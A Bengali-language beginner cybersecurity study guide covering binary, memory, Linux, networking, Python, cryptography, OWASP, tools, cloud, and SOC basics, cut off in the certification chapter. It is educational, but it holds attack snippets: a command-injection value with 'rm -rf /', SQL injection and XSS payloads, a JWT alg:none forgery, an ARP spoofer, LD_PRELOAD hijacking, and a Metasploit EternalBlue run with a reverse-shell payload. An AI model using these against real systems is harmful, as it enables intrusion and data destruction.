@@ -1,0 +1,1018 @@
+(বিগিনার টু জুনিয়র সিকিউরিটি অ্যানালিস্ট)
+লেখক: আপনার সিনিয়র গাইড
+উদ্দেশ্য: বেসিক থেকে শক্ত করে জুনিয়র লেভেলে রেডি হওয়া
+সংস্করণ: ১.০
+
+🧭 বইয়ের সূচিপত্র
+অধ্যায়	নাম	পৃষ্ঠা
+০	কীভাবে এই বই ব্যবহার করবেন	-
+১	সংখ্যা পদ্ধতি ও ডেটা রিপ্রেজেন্টেশন (Binary, Hex, ASCII)	১
+২	কম্পিউটার আর্কিটেকচার ও মেমোরি	১৫
+৩	লিনাক্স – হ্যাকারের অপারেটিং সিস্টেম	২৮
+৪	নেটওয়ার্কিং – প্যাকেট চোখে দেখা	৪২
+৫	প্রোগ্রামিং ফর হ্যাকারস (Python)	৫৮
+৬	ক্রিপ্টোগ্রাফি – বেসিক টু অ্যাটাক	৭২
+৭	ওয়েব অ্যাপ্লিকেশন সিকিউরিটি (OWASP Top 10)	৮৫
+৮	টুলস পরিচিতি (Nmap, Wireshark, Burp Suite)	৯৮
+৯	ক্লাউড সিকিউরিটি (AWS IAM, Security Groups)	১১০
+১০	ভলনারাবিলিটি অ্যাসেসমেন্ট ও ম্যানেজমেন্ট	১২০
+১১	সিকিউরিটি অপারেশনস (SOC, লগ অ্যানালাইসিস)	১৩০
+১২	সার্টিফিকেশন ও ক্যারিয়ার রোডম্যাপ	১৪০
+অধ্যায় ০: কীভাবে এই বই ব্যবহার করবেন
+এই বই অন্যান্য বই থেকে যেভাবে আলাদা
+সাধারণ বই	এই বই
+একবার পড়ে ফেলার জন্য	বারবার ঘেঁটে দেখার জন্য
+তত্ত্ব বেশি, প্র্যাকটিস কম	প্রতিটি কনসেপ্টের সাথে ল্যাব
+পরীক্ষার জন্য	বাস্তব হ্যাকিংয়ের জন্য
+CSE স্টুডেন্ট যা জানে, তাই	CSE স্টুডেন্ট যা জানে না, তাই
+পড়ার পদ্ধতি
+text
+প্রতিটি অধ্যায়ের জন্য:
+├── ধাপ ১: তত্ত্ব পড়ুন (সাধারণ জ্ঞান)
+├── ধাপ ২: গভীর কনসেপ্ট বুঝুন (CSE-র বাইরে)
+├── ধাপ ৩: হাতে-কলমে ল্যাব করুন (এটাই সবচেয়ে গুরুত্বপূর্ণ)
+├── ধাপ ৪: কুইজ দিন (নিজেকে টেস্ট করুন)
+└── ধাপ ৫: চেকলিস্ট মেলান (মাস্টারি নিশ্চিত করুন)
+প্রতীক ব্যাখ্যা
+প্রতীক	মানে
+📖	তত্ত্ব পড়ুন
+🔬	গভীর কনসেপ্ট
+💻	ল্যাব/প্র্যাকটিস
+✅	চেকলিস্ট
+🎯	চ্যালেঞ্জ
+💡	ট্রিক/টিপস
+
+
+=======================================================
+অধ্যায় ১: সংখ্যা পদ্ধতি ও ডেটা রিপ্রেজেন্টেশন
+📖 ১.১ Binary – ভিত্তি
+মৌলিক ধারণা
+Binary মানে base-2. শুধু ০ আর ১. কম্পিউটারের CPU শুধু binary বোঝে।
+
+Decimal	Binary	Decimal	Binary
+0	0	8	1000
+1	1	9	1001
+2	10	10	1010
+3	11	11	1011
+4	100	12	1100
+5	101	13	1101
+6	110	14	1110
+7	111	15	1111
+স্থানের মান (Weight)
+text
+Binary:   1    0    1    1
+Weight:   8    4    2    1
+গণনা:   1×8 + 0×4 + 1×2 + 1×1 = 8+0+2+1 = 11
+Decimal → Binary (ভাগ পদ্ধতি)
+নিয়ম: ২ দিয়ে ভাগ, ভাগশেষ উল্টা ক্রমে।
+
+text
+উদাহরণ: 13 → binary
+
+13 ÷ 2 = 6, ভাগশেষ 1
+6 ÷ 2 = 3, ভাগশেষ 0
+3 ÷ 2 = 1, ভাগশেষ 1
+1 ÷ 2 = 0, ভাগশেষ 1
+
+উত্তর: 1101
+📖 ১.২ Hexadecimal – Binary এর শর্টকাট
+কেন Hex?
+৪টি binary digit = ১টি hex digit. Binary 10101111 → Hex AF
+
+Hex ডিজিট ও মান (মুখস্থ করতেই হবে)
+Hex	Decimal	Binary
+0	0	0000
+1	1	0001
+2	2	0010
+3	3	0011
+4	4	0100
+5	5	0101
+6	6	0110
+7	7	0111
+8	8	1000
+9	9	1001
+A	10	1010
+B	11	1011
+C	12	1100
+D	13	1101
+E	14	1110
+F	15	1111
+Binary → Hex
+text
+উদাহরণ: 11011010
+৪ করে গ্রুপ: 1101 1010
+Hex: D A
+উত্তর: DA
+Hex → Decimal
+text
+2F = (2×16) + (15×1) = 32+15 = 47
+FF = (15×16) + (15×1) = 240+15 = 255
+📖 ১.৩ ASCII – Letter to Number
+Character	Decimal	Hex	Binary
+'0'	48	30	00110000
+'A'	65	41	01000001
+'B'	66	42	01000010
+'a'	97	61	01100001
+' ' (space)	32	20	00100000
+'\n'	10	0A	00001010
+'\x00' (null)	0	00	00000000
+কেন হ্যাকিং এ লাগে?
+0x41414141 দেখলেই বুঝবেন "AAAA" (pattern)
+
+Shellcode লেখার সময় hex ব্যবহার করেন
+
+Buffer overflow এ return address hex এ লিখেন
+
+💻 ১.৪ Python ল্যাব
+python
+# দ্রুত কনভার্টার
+def convert():
+    print("1. Bin→Dec  2. Dec→Bin  3. Bin→Hex  4. Hex→Bin  5. Hex→Dec  6. Dec→Hex")
+    c = input("Choose: ")
+    
+    if c == '1':
+        print(int(input("Binary: "), 2))
+    elif c == '2':
+        print(bin(int(input("Decimal: ")))[2:])
+    elif c == '3':
+        print(hex(int(input("Binary: "), 2))[2:].upper())
+    elif c == '4':
+        print(bin(int(input("Hex: "), 16))[2:])
+    elif c == '5':
+        print(int(input("Hex: "), 16))
+    elif c == '6':
+        print(hex(int(input("Decimal: ")))[2:].upper())
+
+convert()
+✅ অধ্যায় ১ চেকলিস্ট
+binary → decimal করতে পারি
+
+decimal → binary করতে পারি
+
+binary → hex করতে পারি
+
+hex → binary করতে পারি
+
+hex → decimal করতে পারি
+
+decimal → hex করতে পারি
+
+A-F মানে ১০-১৫ মুখস্থ
+
+FF = ২৫৫ জানি
+
+'A' = 0x41 জানি
+
+
+
+================================================================
+
+অধ্যায় ২: কম্পিউটার আর্কিটেকচার ও মেমোরি
+📖 ২.১ CPU ও রেজিস্টার
+CPU কীভাবে কাজ করে?
+CPU তিনটি কাজ করে: Fetch → Decode → Execute
+
+Fetch: RAM থেকে instruction আনে
+
+Decode: instruction টি কী বোঝায় তা বুঝে
+
+Execute: instruction টি চালায়
+
+গুরুত্বপূর্ণ রেজিস্টার (হ্যাকারের চোখে)
+রেজিস্টার	কাজ	হ্যাকিং এ কেন গুরুত্বপূর্ণ
+EIP/RIP	পরবর্তী instruction এর address	ওভাররাইট করলে program hijack
+ESP/RSP	stack এর top এর address	buffer overflow এর টার্গেট
+EBP/RBP	stack frame এর base	
+EAX/RAX	accumulator (গণনা করে)	
+💡 মনে রাখুন: EIP ওভাররাইট করতে পারলে আপনি প্রোগ্রামের কন্ট্রোল নিতে পারেন।
+
+📖 ২.২ মেমোরি লেআউট
+text
+উচ্চ address
++------------------+
+|     Stack        | ← local variables, return addresses
+| (বড় থেকে ছোট)    |
++------------------+
+|       ↓          |
+|       ↑          |
++------------------+
+|      Heap        | ← dynamic memory (malloc)
+| (ছোট থেকে বড়)    |
++------------------+
+|      Data        | ← global variables
++------------------+
+|      Text        | ← code/instructions
+| (Code)           |
++------------------+
+নিম্ন address
+Stack vs Heap – হ্যাকিং অ্যাঙ্গেল
+Stack	Heap
+Local variables	Dynamic memory (malloc/new)
+Return addresses	Use-after-free vulnerability
+Buffer overflow এখানে হয়	Heap spraying attack
+ছোট, ফাস্ট	বড়, স্লো
+🔬 ২.৩ Buffer Overflow – গভীর কনসেপ্ট
+কেন হয়?
+C ভাষায় gets(), strcpy() চেক করে না ইনপুটের সাইজ।
+
+c
+#include <stdio.h>
+#include <string.h>
+
+void vulnerable() {
+    char buffer[10];
+    gets(buffer);  // বিপজ্জনক! limit চেক করে না
+}
+
+int main() {
+    vulnerable();
+    return 0;
+}
+কীভাবে কাজ করে?
+আপনি ১০ byte এর buffer এ ২০ byte লিখলেন
+
+অতিরিক্ত ১০ byte stack এ থাকা return address overwrite করে
+
+function শেষে program সেই address এ jump করে
+
+আপনি যদি সেখানে malicious code রাখেন, program hijack
+
+💻 ২.৪ ল্যাব: GDB দিয়ে মেমোরি দেখা
+ইন্সটল ও চালান
+bash
+sudo apt install gdb
+gdb ./your_program
+গুরুত্বপূর্ণ GDB কমান্ড
+bash
+break main           # main এ ব্রেকপয়েন্ট
+run                  # program চালান
+info registers       # সব রেজিস্টার দেখুন
+x/20x $esp          # stack এর 20 byte দেখুন
+disassemble main     # assembly দেখুন
+✅ অধ্যায় ২ চেকলিস্ট
+CPU এর fetch-decode-execute বুঝি
+
+EIP/RIP কেন গুরুত্বপূর্ণ জানি
+
+Stack ও Heap এর পার্থক্য জানি
+
+Buffer overflow কেন হয় বুঝি
+
+GDB দিয়ে basic debugging করতে পারি
+
+
+===================================================
+
+অধ্যায় ৩: লিনাক্স – হ্যাকারের অপারেটিং সিস্টেম
+📖 ৩.১ কেন লিনাক্স?
+৯০% সার্ভার লিনাক্স চালায়
+
+সব hacking tools লিনাক্সে ফার্স্ট ক্লাস সাপোর্ট
+
+ওপেন সোর্স – ভিতরে কী হচ্ছে দেখা যায়
+
+Kali Linux = ৬০০+ প্রি-ইনস্টলড টুলস
+
+📖 ৩.২ গুরুত্বপূর্ণ কমান্ড (প্রতিদিন লাগবে)
+ফাইল সিস্টেম
+bash
+ls -la              # সব ফাইল (hidden সহ) দেখে
+cd /etc             # directory change
+pwd                 # কোথায় আছি দেখায়
+cat file.txt        # ফাইল দেখায়
+less file.txt       # বড় ফাইল দেখায়
+head -10 file.txt   # প্রথম ১০ লাইন
+tail -10 file.txt   # শেষ ১০ লাইন
+grep "error" log    # specific pattern খোঁজে
+find / -name "*.conf"  # ফাইল খোঁজে
+পারমিশন
+bash
+chmod 755 file      # permission change
+chown user file     # owner change
+ls -l               # permission দেখা
+প্রসেস ম্যানেজমেন্ট
+bash
+ps aux              # চলমান প্রসেস
+top                 # রিয়েলটাইম প্রসেস
+kill -9 PID         # প্রসেস kill
+htop                # better version of top
+নেটওয়ার্ক
+bash
+ip a                # IP address দেখে
+netstat -tulpn      # কোন পোর্ট খোলা আছে
+ss -tulpn           # netstat এর আধুনিক ভার্সন
+ping google.com     # connectivity check
+curl example.com    # HTTP request
+🔬 ৩.৩ SUID, SGID, Sticky Bit – যা CSE স্টুডেন্ট জানে না
+SUID (Set User ID)
+bash
+# SUID ফাইল খোঁজা
+find / -perm -4000 2>/dev/null
+
+# উদাহরণ: /usr/bin/passwd
+ls -l /usr/bin/passwd
+# আউটপুট: -rwsr-xr-x (s দেখাচ্ছে = SUID)
+কেন গুরুত্বপূর্ণ? SUID binary চালালে তা owner এর privilege পায় (সাধারণত root)। ভুল SUID দিয়ে privilege escalation করা যায়।
+
+Sticky Bit
+bash
+# উদাহরণ: /tmp
+ls -ld /tmp
+# আউটপুট: drwxrwxrwt (t দেখাচ্ছে = sticky)
+কাজ: শুধু ফাইলের owner delete করতে পারে।
+
+🔬 ৩.৪ LD_PRELOAD – Library Hijacking
+bash
+# ১. একটি malicious library লিখুন (malicious.c)
+# ২. কম্পাইল করুন
+gcc -shared -o malicious.so malicious.c
+
+# ৩. ব্যবহার করুন
+LD_PRELOAD=./malicious.so ./target_program
+কাজ: target program এর আগে আপনার library load হবে, যেকোনো function hijack করতে পারবেন।
+
+💻 ৩.৫ ল্যাব: প্রথম Kali Linux সেটআপ
+ভার্চুয়ালবক্সে Kali ইন্সটল
+bash
+# ১. VirtualBox ডাউনলোড ও ইন্সটল
+# ২. Kali Linux ISO ডাউনলোড (kali.org)
+# ৩. New VM → Linux → Debian (64-bit)
+# ৪. RAM: 2GB+ , HDD: 20GB+
+# ৫. ISO থেকে boot করে ইন্সটল
+প্রথম কমান্ড
+bash
+sudo apt update && sudo apt upgrade -y
+sudo apt install git python3-pip -y
+✅ অধ্যায় ৩ চেকলিস্ট
+ls, cd, pwd, cat, grep ব্যবহার করতে পারি
+
+chmod দিয়ে permission change করতে পারি
+
+SUID কি বুঝি এবং খুঁজে বের করতে পারি
+
+LD_PRELOAD কি জানি
+
+Kali Linux ইনস্টল করতে পারি
+
+
+
+
+================================================
+
+
+অধ্যায় ৪: নেটওয়ার্কিং – প্যাকেট চোখে দেখা
+📖 ৪.১ OSI মডেল ও হ্যাকিং
+Layer	নাম	প্রোটোকল	আক্রমণ
+7	Application	HTTP, DNS, SMTP	SQLi, XSS
+6	Presentation	SSL/TLS	Heartbleed
+5	Session	NetBIOS, SMB	SMB relay
+4	Transport	TCP, UDP	SYN flood
+3	Network	IP, ICMP	IP spoofing
+2	Data Link	Ethernet, ARP	ARP poisoning
+1	Physical	ক্যাবল	জ্যামিং
+📖 ৪.২ TCP Header – গভীরে
+text
+ 0                   1                   2                   3
+ 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|          Source Port          |       Destination Port        |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                        Sequence Number                        |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                     Acknowledgment Number                     |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|  Data |       |C|E|U|A|P|R|S|F|                               |
+| Offset| Rsrvd |W|C|R|C|S|S|Y|I|            Window             |
+|       |       |R|E|G|K|H|T|N|N|                               |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|           Checksum            |        Urgent Pointer         |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+TCP Flags (হ্যাকারদের বেস্ট ফ্রেন্ড)
+Flag	নাম	কাজ	হ্যাকিং ইউজ
+SYN	Synchronize	connection শুরু করে	SYN flood attack
+ACK	Acknowledgment	প্যাকেট পেয়েছে জানায়	
+FIN	Finish	connection শেষ করে	
+RST	Reset	connection জোর করে বন্ধ	RST injection
+PSH	Push	immediate delivery	
+URG	Urgent	urgent data	
+📖 ৪.৩ পোর্ট স্ক্যানিং
+পোর্টের অবস্থা
+অবস্থা	মানে
+Open	সার্ভিস চলছে (যেমন 80 = HTTP)
+Closed	কোন সার্ভিস নেই
+Filtered	Firewall ব্লক করছে
+গুরুত্বপূর্ণ পোর্ট (মুখস্থ করুন)
+পোর্ট	সার্ভিস	হ্যাকিং প্রাসঙ্গিকতা
+21	FTP	anonymous login
+22	SSH	brute force
+23	Telnet	unencrypted
+25	SMTP	email spoofing
+80	HTTP	web attacks
+443	HTTPS	encrypted
+445	SMB	EternalBlue
+3306	MySQL	SQL injection
+3389	RDP	brute force
+🔬 ৪.৪ Nmap – স্ক্যানিং এর রাজা
+বেসিক স্ক্যান
+bash
+# ping scan (কোন হোস্ট লাইভ?)
+nmap -sn 192.168.1.0/24
+
+# port scan (সব পোর্ট)
+nmap -p- 192.168.1.10
+
+# service version detection
+nmap -sV 192.168.1.10
+
+# OS detection
+nmap -O 192.168.1.10
+
+# SYN scan (stealth)
+nmap -sS 192.168.1.10
+
+# script scan
+nmap --script vuln 192.168.1.10
+আউটপুট বুঝা
+bash
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   open     http
+443/tcp  closed   https
+8080/tcp filtered http-alt
+💻 ৪.৫ ল্যাব: Wireshark দিয়ে প্যাকেট দেখা
+ক্যাপচার ফিল্টার (capture করার সময়)
+text
+host 192.168.1.10     # specific host
+port 80               # HTTP traffic
+tcp                   # সব TCP
+not arp               # ARP বাদ দিয়ে
+ডিসপ্লে ফিল্টার (দেখার সময়)
+text
+http                  # HTTP প্যাকেট
+tcp.flags.syn == 1    # SYN flag ওয়ালা
+ip.src == 192.168.1.5 # source IP
+tcp.port == 443       # HTTPS traffic
+
+=========================================================
+
+✅ অধ্যায় ৪ চেকলিস্ট
+OSI মডেলের ৭ লেয়ার নাম বলতে পারি
+
+TCP flags এর নাম ও কাজ জানি
+
+গুরুত্বপূর্ণ পোর্ট (২২,৮০,৪৪৩,৪৪৫) জানি
+
+Nmap দিয়ে বেসিক স্ক্যান করতে পারি
+
+Wireshark দিয়ে প্যাকেট দেখতে পারি
+
+অধ্যায় ৫: প্রোগ্রামিং ফর হ্যাকারস (Python)
+📖 ৫.১ কেন Python?
+দ্রুত প্রোটোটাইপ
+
+বিল্ট-ইন লাইব্রেরি (socket, scapy, requests)
+
+হাজারো সিকিউরিটি টুল Python এ লেখা
+
+📖 ৫.২ সিকিউরিটি রিলেটেড Python কনসেপ্ট
+সকেট প্রোগ্রামিং
+python
+import socket
+
+# TCP client
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect(("google.com", 80))
+client.send(b"GET / HTTP/1.1\r\nHost: google.com\r\n\r\n")
+response = client.recv(4096)
+print(response)
+
+# UDP client
+udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+udp.sendto(b"Hello", ("8.8.8.8", 53))
+কমান্ড ইনজেকশন – কেন dangerous?
+python
+# খারাপ কোড (কখনই করবেন না)
+import os
+user_input = input("Enter IP: ")
+os.system(f"ping {user_input}")
+
+# যদি user_input = "8.8.8.8; rm -rf /" হয়?
+# ping 8.8.8.8; rm -rf / চালাবে!
+ভালো কোড
+python
+import subprocess
+user_input = input("Enter IP: ")
+subprocess.run(["ping", user_input])  # shell=False by default
+eval() – কখনই use করবেন না
+python
+# বিপজ্জনক
+result = eval(input("Enter calculation: "))
+
+# user লিখতে পারে: __import__('os').system('whoami')
+💻 ৫.৩ ল্যাব: নিজের টুল লেখা
+পোর্ট স্ক্যানার
+python
+#!/usr/bin/env python3
+import socket
+import sys
+from datetime import datetime
+
+def scan_port(host, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(1)
+    result = sock.connect_ex((host, port))
+    sock.close()
+    return result == 0
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} <host>")
+        sys.exit(1)
+    
+    host = sys.argv[1]
+    print(f"Scanning {host}")
+    start = datetime.now()
+    
+    for port in range(1, 1025):
+        if scan_port(host, port):
+            print(f"Port {port}: Open")
+    
+    end = datetime.now()
+    print(f"Scan completed in {end-start}")
+
+if __name__ == "__main__":
+    main()
+ARP Spoofer (সতর্ক: শুধু ল্যাবে)
+python
+#!/usr/bin/env python3
+from scapy.all import ARP, send
+
+def arp_spoof(target_ip, spoof_ip):
+    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
+    send(packet, verbose=False)
+
+# শুধু আপনার নিজের ল্যাব নেটওয়ার্কে চালান!
+
+==============================================
+
+✅ অধ্যায় ৫ চেকলিস্ট
+socket দিয়ে basic connection করতে পারি
+
+কেন os.system() dangerous জানি
+
+কেন eval() dangerous জানি
+
+নিজের port scanner লিখতে পারি
+
+Scapy দিয়ে packet তৈরি করতে পারি
+
+অধ্যায় ৬: ক্রিপ্টোগ্রাফি – বেসিক টু অ্যাটাক
+📖 ৬.১ হ্যাশিং (Hashing)
+কী?
+ইনপুট → fixed-length আউটপুট (একমুখী)
+
+উদাহরণ
+python
+import hashlib
+
+text = "Hello World"
+md5_hash = hashlib.md5(text.encode()).hexdigest()
+sha256_hash = hashlib.sha256(text.encode()).hexdigest()
+
+print(f"MD5: {md5_hash}")
+print(f"SHA256: {sha256_hash}")
+Properties of good hash
+Deterministic: একই ইনপুটে একই আউটপুট
+
+Fast to compute
+
+Pre-image resistant: হ্যাশ থেকে ইনপুট বের করা কঠিন
+
+Collision resistant: দুটি ভিন্ন ইনপুটের একই হ্যাশ হওয়া কঠিন
+
+কোথায় ব্যবহার হয়?
+পাসওয়ার্ড স্টোরেজ
+
+ফাইল ইন্টিগ্রিটি চেক
+
+ডিজিটাল সিগনেচার
+
+হ্যাকিং অ্যাঙ্গেল
+bash
+# MD5 আর SHA1 ভাঙা (collision সম্ভব)
+# পাসওয়ার্ড ক্র্যাকিং
+john --format=raw-md5 hashes.txt
+hashcat -m 0 -a 0 hash.txt wordlist.txt
+📖 ৬.২ এনক্রিপশন (Encryption)
+Symmetric (একই চাবি)
+Algorithm	Key Size	স্ট্যাটাস
+AES	128/256 bit	✅ নিরাপদ
+DES	56 bit	❌ ভাঙা
+RC4	variable	❌ ভাঙা
+python
+from cryptography.fernet import Fernet
+
+key = Fernet.generate_key()
+cipher = Fernet(key)
+encrypted = cipher.encrypt(b"Secret Message")
+decrypted = cipher.decrypt(encrypted)
+Asymmetric (দুই চাবি – public/private)
+Algorithm	ব্যবহার
+RSA	সিগনেচার, কী এক্সচেঞ্জ
+ECC	আধুনিক, ছোট কী
+python
+from cryptography.hazmat.primitives.asymmetric import rsa
+
+private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+public_key = private_key.public_key()
+🔬 ৬.৩ সাধারণ ভুল যা আক্রমণের দরজা খোলে
+1. একই কী বারবার ব্যবহার
+2. Padding Oracle Attack (CBC mode)
+bash
+# টুল: padbuster
+padbuster http://example.com/file?id=123 encrypted_token 8 -cookies
+3. JWT token manipulation
+python
+# JWT token এ alg: none attack
+import jwt
+token = jwt.encode({"user": "admin"}, None, algorithm="none")
+
+
+
+
+==================================================
+✅ অধ্যায় ৬ চেকলিস্ট
+হ্যাশিং আর এনক্রিপশনের পার্থক্য জানি
+
+MD5/SHA1 কেন নিরাপদ নয় বুঝি
+
+AES কি জানি
+
+JWT attack বুঝি
+
+অধ্যায় ৭: ওয়েব অ্যাপ্লিকেশন সিকিউরিটি
+📖 ৭.১ OWASP Top 10 (২০২১)
+#	Vulnerability	সংক্ষেপে
+1	Broken Access Control	ইউজার যা দেখার না, তা দেখতে পায়
+2	Cryptographic Failures	এনক্রিপশন ভুল
+3	Injection	SQL, Command, LDAP injection
+4	Insecure Design	ডিজাইন লেভেলের দুর্বলতা
+5	Security Misconfiguration	ডিফল্ট পাসওয়ার্ড, error message
+6	Vulnerable Components	পুরনো library
+7	Identification Failures	session management ভুল
+8	Software/Data Integrity	supply chain attack
+9	Security Logging Failures	লগ রাখে না
+10	SSRF	সার্ভার থেকে অন্য সার্ভারে request
+🔬 ৭.২ SQL Injection – গভীরে
+কেন হয়?
+php
+// খারাপ কোড
+$username = $_POST['username'];
+$query = "SELECT * FROM users WHERE username = '$username'";
+
+// attack: ' OR '1'='1' --
+// query হয়: SELECT * FROM users WHERE username = '' OR '1'='1' --'
+টাইম বেসড Blind SQL Injection
+sql
+' OR IF(1=1, SLEEP(5), 0) -- 
+Union Based SQL Injection
+sql
+' UNION SELECT username, password FROM users -- 
+ল্যাব: SQLi ল্যাব সেটআপ
+bash
+git clone https://github.com/Audi-1/sqli-labs
+# ডকার বা XAMPP এ চালান
+🔬 ৭.৩ XSS (Cross-Site Scripting)
+টাইপসমূহ
+Type	কীভাবে
+Reflected	URL parameter এ script
+Stored	database এ save হয়
+DOM-based	client-side code এ
+উদাহরণ
+javascript
+// vulnerable code
+document.write('<h1>' + location.hash + '</h1>');
+
+// attack
+https://example.com/#<img src=x onerror=alert(1)>
+💻 ৭.৪ ল্যাব: Burp Suite সেটআপ
+ফ্রি ভার্সনে যা করা যায়
+Proxy → HTTP traffic ইন্টারসেপ্ট
+
+Repeater → request modify করে resend
+
+Intruder → brute force (থ্রোটলড)
+
+Decoder → encode/decode
+
+প্রথম স্টেপ
+bash
+# Burp Suite ডাউনলোড
+# Proxy → Options → 127.0.0.1:8080
+# ব্রাউজারে proxy set করুন
+# CA certificate install করুন
+
+
+===========================================
+
+✅ অধ্যায় ৭ চেকলিস্ট
+OWASP Top 10 এর নাম জানি
+
+SQL injection কেন হয় বুঝি
+
+XSS এর ধরন বলতে পারি
+
+Burp Suite দিয়ে HTTP request modify করতে পারি
+
+============================
+
+অধ্যায় ৮: টুলস পরিচিতি
+📖 ৮.১ Nmap (নেটওয়ার্ক ম্যাপিং)
+bash
+# লাইভ হোস্ট খুঁজে
+nmap -sn 192.168.1.0/24
+
+# দ্রুত স্ক্যান (সাধারণ পোর্ট)
+nmap -F 192.168.1.10
+
+# সব পোর্ট স্ক্যান (ধীর)
+nmap -p- 192.168.1.10
+
+# OS ডিটেকশন
+nmap -O 192.168.1.10
+
+# সার্ভিস ভার্সন
+nmap -sV 192.168.1.10
+
+# স্ক্রিপ্ট ইঞ্জিন
+nmap --script vuln 192.168.1.10
+
+# UDP স্ক্যান
+nmap -sU 192.168.1.10
+📖 ৮.২ Wireshark (প্যাকেট অ্যানালাইসিস)
+দ্রুত ফিল্টার
+text
+http.request.method == GET
+tcp.port == 443
+ip.src == 192.168.1.100
+tcp.flags.syn == 1 && tcp.flags.ack == 0
+dns.qry.name contains "google"
+স্ট্যাটিস্টিকস
+text
+Statistics → Protocol Hierarchy
+Statistics → Conversations
+Statistics → HTTP → Requests
+📖 ৮.৩ Burp Suite (ওয়েব টেস্টিং)
+সিকোয়েন্স
+Proxy → Intercept on
+
+ব্রাউজারে request পাঠান
+
+Request modify করে Forward
+
+Repeater এ send করে দেখুন
+
+Intruder এ payload positions সেট করুন
+
+📖 ৮.৪ Metasploit (এক্সপ্লয়েটেশন)
+bash
+msfconsole
+
+# search for exploit
+search eternalblue
+
+# use module
+use exploit/windows/smb/ms17_010_eternalblue
+
+# show options
+show options
+
+# set target
+set RHOSTS 192.168.1.10
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# exploit
+run
+
+===============================
+
+✅ অধ্যায় ৮ চেকলিস্ট
+Nmap দিয়ে বেসিক স্ক্যান করতে পারি
+
+Wireshark দিয়ে প্যাকেট ফিল্টার করতে পারি
+
+Burp Suite দিয়ে HTTP request modify করতে পারি
+
+Metasploit এর বেসিক জানি
+
+
+==================================
+
+
+অধ্যায় ৯: ক্লাউড সিকিউরিটি
+📖 ৯.১ AWS IAM – সবচেয়ে গুরুত্বপূর্ণ
+IAM ইউজার টাইপ
+টাইপ	ব্যবহার
+রুট ইউজার	তৈরি করার সময়, এরপর lock করে রাখুন
+IAM ইউজার	daily কাজের জন্য
+IAM রোল	EC2, Lambda এর জন্য
+Least Privilege Principle
+text
+❌ খারাপ: AdministratorAccess
+✅ ভালো: ReadOnlyAccess + specific write permission
+ক্লাউড ট্রায়াল অ্যাকাউন্ট
+bash
+# AWS Free Tier সাইনআপ (ক্রেডিট কার্ড লাগে কিন্তু চার্জ হবে না সতর্ক থাকলে)
+# ১ বছরের জন্য কিছু service free
+🔬 ৯.২ কমন মিসকনফিগারেশন
+S3 bucket public → data leak
+
+Security group wide open (0.0.0.0/0) → সবাই access পায়
+
+Access keys in code → GitHub এ leak
+
+MFA না করা
+
+==================
+
+
+✅ অধ্যায় ৯ চেকলিস্ট
+IAM ইউজার vs রোল বুঝি
+
+Least privilege principle জানি
+
+S3 bucket misconfiguration বুঝি
+
+অধ্যায় ১০: ভলনারাবিলিটি অ্যাসেসমেন্ট
+📖 ১০.১ প্রসেস
+text
+1. স্কোপ নির্ধারণ (কোন asset scan করবেন)
+2. স্ক্যান চালানো (Nessus/OpenVAS)
+3. ফলাফল অ্যানালাইসিস
+4. রিপোর্ট তৈরি
+5. ম্যানেজমেন্টের সাথে আলোচনা
+📖 ১০.২ CVSS স্কোর
+Severity	Score Range
+Critical	9.0 - 10.0
+High	7.0 - 8.9
+Medium	4.0 - 6.9
+Low	0.1 - 3.9
+None	0
+💻 ১০.৩ ল্যাব: OpenVAS সেটআপ
+bash
+# ডকারে চালানো সহজ
+docker run -d -p 443:443 --name openvas mikesplain/openvas
+
+# ব্রাউজারে https://localhost
+# user: admin, password: admin
+✅ অধ্যায় ১০ চেকলিস্ট
+VA প্রসেস বুঝি
+
+CVSS স্কোর বুঝি
+
+OpenVAS চালাতে পারি
+
+অধ্যায় ১১: সিকিউরিটি অপারেশনস (SOC)
+📖 ১১.১ সোক অ্যানালিস্টের কাজ
+text
+1. Monitor (SIEM দেখে)
+2. Detect (alert চিহ্নিত)
+3. Triage (real নাকি false positive)
+4. Investigate (গভীরে দেখা)
+5. Respond (contain/eradicate)
+📖 ১.১১.২ লগ কোথায় থাকে?
+bash
+# Linux
+/var/log/syslog
+/var/log/auth.log
+/var/log/apache2/access.log
+
+# Windows
+Event Viewer → Security, Application, System
+🔬 ১১.৩ এটাক চিহ্নিত করা
+Brute Force
+bash
+# ফেইলড SSH লগিন গণনা
+grep "Failed password" /var/log/auth.log | awk '{print $9}' | sort | uniq -c | sort -nr
+Port Scan
+bash
+# অনেক port থেকে connection
+grep "DPT=" /var/log/kern.log | awk '{print $10}' | sort | uniq -c | sort -nr
+
+========================
+
+✅ অধ্যায় ১১ চেকলিস্ট
+SOC analyst কি করে জানি
+
+Linux log কোথায় থাকে জানি
+
+brute force চিহ্নিত করতে পারি
+
+অধ্যায় ১২: সার্টিফিকেশন ও ক্যারিয়ার
+📖 ১২.১ সার্টিফিকেশন রোডম্যাপ
+text
+Entry Level (০-১ বছর):
+├── CompTIA Security+ (সবার জন্য)
+├── Google Cybersecurity Certificate
+└── CEH (Practical না, কিন্তু HR পছন্দ করে)
+
+Mid Level (২-৩ বছর):
+├── CySA+ (Blue team)
+├── GPEN (Red team - дорого)
+└── AWS Security Specialty
+
+Advanced (৩-৫ বছর):
+├── CISSP (ম্যানেজমেন্ট)
